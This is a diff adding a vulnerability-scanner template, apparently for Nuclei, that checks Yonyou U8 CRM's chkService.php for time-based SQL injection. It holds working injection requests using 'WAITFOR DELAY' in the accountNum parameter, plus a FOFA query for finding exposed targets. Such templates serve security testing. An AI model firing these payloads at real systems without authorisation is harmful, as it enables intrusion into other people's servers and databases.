@@ -1,0 +1,55 @@
+id: poc-yaml-yongyou-u8-crm-chkservice-sqli
+info:
+  name: 用友U8 CRM chkService.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 用友U8+CRM
+    fofa: title="用友U8CRM"
+variables:
+  t1: "{{rand_int(6,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3) + 2}}"
+http:
+  - raw:
+      - |
+        GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - "\"code\":\"\""
+          - "\"message\":\"\""
+  - raw:
+      - |
+        GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:{{t3}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= to_number(t3)
+          - duration <= to_number(t4)
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - "\"code\":\"\""
+          - "\"message\":\"\""
